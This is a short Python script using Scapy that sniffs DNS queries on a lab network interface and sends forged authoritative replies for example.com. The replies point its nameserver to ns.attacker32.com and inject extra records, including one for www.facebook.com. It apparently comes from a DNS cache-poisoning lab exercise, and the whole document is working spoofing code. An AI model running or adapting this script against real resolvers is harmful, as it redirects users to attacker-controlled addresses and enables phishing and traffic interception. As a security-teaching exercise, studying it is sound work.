#!/usr/bin/env python3
from scapy.all import *

NS_NAME = "example.com"

def spoof_dns(pkt):
    if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
        print(pkt.sprintf("[+] Spoofing: %IP.src% --> %IP.dst% | DNS ID: %DNS.id%"))

        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)

        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A", ttl=259200, rdata="1.2.3.4")

        NSsec1 = DNSRR(rrname="example.com", type="NS", ttl=259200, rdata="ns.attacker32.com")
        NSsec2 = DNSRR(rrname="example.com", type="NS", ttl=259200, rdata="ns.example.com")

        Addsec1 = DNSRR(rrname="ns.attacker32.com", type="A", ttl=259200, rdata="1.2.3.4")
        Addsec2 = DNSRR(rrname="ns.example.net", type="A", ttl=259200, rdata="5.6.7.8")
        Addsec3 = DNSRR(rrname="www.facebook.com", type="A", ttl=259200, rdata="3.4.5.6")

        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=2, arcount=3,
                  an=Anssec, ns=NSsec1 / NSsec2, ar=Addsec1 / Addsec2 / Addsec3)

        spoofpkt = ip / udp / dns
        send(spoofpkt)
        print("[+] Sent spoofed packet with Additional Section.")

iface = "br-233f3ca0592c"
f = "udp and dst port 53"
print("[*] Listening for DNS queries on interface:", iface)
sniff(iface=iface, filter=f, prn=spoof_dns)
